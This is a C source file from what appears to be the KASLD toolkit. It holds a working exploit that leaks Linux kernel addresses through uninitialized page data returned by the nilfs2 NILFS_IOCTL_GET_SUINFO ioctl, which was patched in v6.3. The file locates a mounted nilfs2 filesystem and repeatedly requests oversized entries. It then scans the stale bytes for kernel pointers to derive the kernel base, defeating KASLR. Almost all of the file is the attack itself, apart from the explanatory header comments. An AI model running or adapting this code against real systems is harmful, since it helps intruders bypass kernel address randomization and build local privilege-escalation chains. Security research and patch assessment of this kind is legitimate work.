// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel heap data via nilfs2 ioctl uninitialized page copy.
//
// nilfs_ioctl_wrap_copy() in fs/nilfs2/ioctl.c allocates a page with
// __get_free_pages() (which does not zero the memory) and then copies
// it to userspace. When the v_size (element size) passed via the ioctl
// is larger than the actual kernel struct written by the callback, the
// trailing bytes of each element contain stale page allocator data.
//
// The NILFS_IOCTL_GET_SUINFO ioctl returns segment usage info where
// each entry is a struct nilfs_suinfo (24 bytes on x86_64), but the
// interface allows requesting arbitrary v_size. Bytes between the
// actual struct size and v_size contain uninitialized page data, which
// may include kernel pointers from previous page users.
//
// Leak primitive:
//   Data leaked:      kernel page allocator data (stale page contents)
//   Kernel subsystem: fs — nilfs_ioctl_wrap_copy() (fs/nilfs2/ioctl.c)
//   Data structure:   __get_free_pages() buffer (order 0, 4096 bytes)
//   Address type:     virtual (heap/page pointers)
//   Method:           heuristic (scan trailing bytes for pointers)
//   CVE:              (no CVE assigned)
//   Patched:          v6.3 (commit 003587000276, 2023-03)
//   Introduced:       v2.6.30 (nilfs2 merge, 2009)
//   Status:           fixed in v6.3
//   Access check:     requires a mounted nilfs2 filesystem
//   Source:
//   https://elixir.bootlin.com/linux/v6.2/source/fs/nilfs2/ioctl.c
//
// Mitigations:
//   Patched in v6.3 (replaced __get_free_pages with get_zeroed_page).
//   Requires a nilfs2 filesystem to be mounted. The nilfs2 module may
//   need to be loaded. init_on_alloc=1 mitigates on recent kernels.
//
// References:
// https://github.com/torvalds/linux/commit/003587000276
// https://elixir.bootlin.com/linux/v6.2/source/fs/nilfs2/ioctl.c#L656
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Exploits uninitialized page data in nilfs2 NILFS_IOCTL_GET_SUINFO. "
    "nilfs_ioctl_wrap_copy() allocates a page with __get_free_pages() "
    "(not zeroed) and copies it to userspace. When the requested element "
    "size exceeds the actual struct size, trailing bytes contain stale "
    "page allocator data with potential kernel pointers. Affects kernels "
    "from v2.6.30 to v6.3.");

KASLD_META("method:heuristic\n"
           "phase:probing\n"
           "addr:virtual\n"
           "patch:v6.3\n"
           "config:CONFIG_NILFS2_FS\n");

/* nilfs2 ioctl definitions — included here to avoid requiring nilfs2
 * userspace headers */
#define NILFS_IOCTL_IDENT 'n'

struct nilfs_argv {
  uint64_t v_base;
  uint32_t v_nmembs;
  uint16_t v_size;
  uint16_t v_flags;
  uint64_t v_index;
};

#define NILFS_IOCTL_GET_SUINFO _IOR(NILFS_IOCTL_IDENT, 0x84, struct nilfs_argv)

/* struct nilfs_suinfo is 24 bytes on x86_64 */
#define NILFS_SUINFO_REAL_SIZE 24

/* We request a larger v_size to expose trailing uninitialized bytes */
#define REQUEST_VSIZE 256

/* Number of entries to request */
#define REQUEST_NMEMBS 16

static int nilfs_ioctl_unsupported;

/* Try to find a nilfs2 mount point by scanning /proc/mounts */
static int open_nilfs2_fd(void) {
  FILE *fp;
  char line[512];
  char mountpoint[256];
  int fd;

  fp = fopen("/proc/mounts", "r");
  if (!fp) {
    perror("[-] fopen /proc/mounts");
    return -1;
  }

  while (fgets(line, sizeof(line), fp)) {
    char dev[256], fstype[64];
    if (sscanf(line, "%255s %255s %63s", dev, mountpoint, fstype) >= 3) {
      if (strcmp(fstype, "nilfs2") == 0) {
        fclose(fp);
        fd = open(mountpoint, O_RDONLY | O_DIRECTORY);
        if (fd >= 0) {
          printf("[.] found nilfs2 mount at %s\n", mountpoint);
          return fd;
        }
      }
    }
  }

  fclose(fp);
  return -1;
}

static unsigned long try_leak(int nilfs_fd) {
  struct nilfs_argv argv;
  size_t buf_size = (size_t)REQUEST_VSIZE * REQUEST_NMEMBS;
  unsigned char *buf;
  unsigned long addr = 0;

  buf = calloc(1, buf_size);
  if (!buf)
    return 0;

  memset(&argv, 0, sizeof(argv));
  argv.v_base = (uint64_t)(uintptr_t)buf;
  argv.v_nmembs = REQUEST_NMEMBS;
  argv.v_size = REQUEST_VSIZE;
  argv.v_index = 0;

  if (ioctl(nilfs_fd, NILFS_IOCTL_GET_SUINFO, &argv) < 0) {
    if (errno == ENOTTY || errno == EINVAL)
      fprintf(stderr, "[-] NILFS_IOCTL_GET_SUINFO not supported\n");
    else
      perror("[-] ioctl NILFS_IOCTL_GET_SUINFO");
    if (errno == ENOTTY || errno == EINVAL)
      nilfs_ioctl_unsupported = 1;
    free(buf);
    return 0;
  }

  /* Scan trailing bytes of each entry (past the real struct) for
   * kernel pointers */
  for (uint32_t i = 0; i < argv.v_nmembs && i < REQUEST_NMEMBS; i++) {
    unsigned char *entry = buf + (size_t)i * REQUEST_VSIZE;
    /* Skip the real struct bytes, scan only the trailing area */
    for (size_t off = NILFS_SUINFO_REAL_SIZE;
         off + sizeof(unsigned long) <= REQUEST_VSIZE;
         off += sizeof(unsigned long)) {
      unsigned long val;
      memcpy(&val, entry + off, sizeof(val));
      if (val >= KERNEL_BASE_MIN && val <= KERNEL_BASE_MAX) {
        addr = val;
        free(buf);
        return addr;
      }
    }
  }

  free(buf);
  return addr;
}

int main(void) {
  int fd;
  unsigned long addr;

  printf("[.] trying nilfs2 NILFS_IOCTL_GET_SUINFO heap leak ...\n");

  fd = open_nilfs2_fd();
  if (fd < 0) {
    printf("[-] no nilfs2 mount found\n");
    return 0;
  }

  for (int i = 0; i < 100000; i++) {
    addr = try_leak(fd);
    if (nilfs_ioctl_unsupported)
      break;
    if (addr) {
      close(fd);
      printf("leaked possible kernel pointer: %lx\n", addr);
      printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
      kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
                   KASLD_REGION_KERNEL_TEXT, NULL);
      return 0;
    }
  }

  close(fd);
  printf("[-] no kernel address leaked via nilfs2 ioctl\n");
  return 0;
}
